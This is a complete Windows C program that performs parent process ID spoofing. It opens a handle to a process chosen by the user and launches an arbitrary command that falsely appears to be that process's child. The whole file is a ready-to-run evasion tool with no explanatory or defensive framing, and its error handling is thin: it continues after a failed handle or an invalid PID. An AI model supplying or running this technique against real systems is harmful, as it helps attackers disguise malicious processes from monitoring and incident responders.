#include <windows.h>
#include <stdio.h>

int main(int argc, char* argv[]) {
	DWORD ppid = 0;
	if (argc == 3) {
		ppid = atoi(argv[1]);
		if (!ppid) {
			printf("Usage: ./%s <pid to spoof as parent> <procToExecute>", argv[0]);
		}
	}
	else {
		printf("Usage: ./%s <pid to spoof as parent> <procToExecute>", argv[0]);
		return 0;
	}

	STARTUPINFOEXA sinfo;
	PROCESS_INFORMATION pinfo;
	SIZE_T attributeSize;
	ZeroMemory(&sinfo, sizeof(STARTUPINFOEXA));

	HANDLE parentProcessHandle = OpenProcess(PROCESS_CREATE_PROCESS | PROCESS_DUP_HANDLE, FALSE, ppid);
	if (!parentProcessHandle) {
		printf("Error: %lu\n", GetLastError());
	}

	InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
	sinfo.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);
	InitializeProcThreadAttributeList(sinfo.lpAttributeList, 1, 0, &attributeSize);
	UpdateProcThreadAttribute(sinfo.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &parentProcessHandle, sizeof(HANDLE), NULL, NULL);
	sinfo.StartupInfo.cb = sizeof(STARTUPINFOEXA);

	CreateProcessA(NULL, argv[2], NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &sinfo.StartupInfo, &pinfo);

	return 0;
}